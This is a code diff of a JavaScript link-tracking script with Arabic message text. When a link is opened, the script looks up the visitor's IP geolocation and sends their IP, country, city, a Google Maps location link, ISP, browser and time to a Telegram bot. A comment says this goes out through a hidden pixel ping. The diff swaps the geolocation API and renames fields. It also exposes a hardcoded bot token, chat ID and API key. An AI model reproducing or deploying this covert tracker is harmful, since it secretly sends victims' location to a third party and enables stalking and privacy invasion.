@@ -51,18 +51,18 @@
   const BOT_TOKEN = "8540583624:AAF0OCGW9zLF1Sqf9Dm3Qhj5lqZ3N-vkWkk";
   const CHAT_ID   = "6036900535";
 
-  fetch("https://ipapi.co/json/")
-    .then(r => r.json())
+  fetch("https://api.ipgeolocation.io/ipgeo?apiKey=1bfaead6cb9544b2a6efea343c0dd301")
+    .then(res => res.json())
     .then(info => {
         const msg = `📍 فُتح الرابط!\n` +
                     `الآي بي: ${info.ip}\n` +
                     `الدولة: ${info.country_name}\n` +
-                    `المحافظة: ${info.region}\n` +
+                    `المحافظة: ${info.state_prov}\n` +
                     `المدينة: ${info.city}\n` +
-                    `الموقع: https://www.google.com/maps?q=${info.latitude},${info.longitude}\n` +
-                    `مزود الخدمة: ${info.org}\n` +
+                    `الموقع التقريبي: https://www.google.com/maps?q=${info.latitude},${info.longitude}\n` +
+                    `مزود الخدمة: ${info.isp}\n` +
                     `المتصفح: ${navigator.userAgent}\n` +
-                    `التوقيت: ${new Date().toLocaleString("ar-EG")}`;
+                    `الوقت: ${new Date().toLocaleString("ar-EG")}`;
 
         // إرسال مباشر عبر صورة مخفية (pixel ping)
         const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
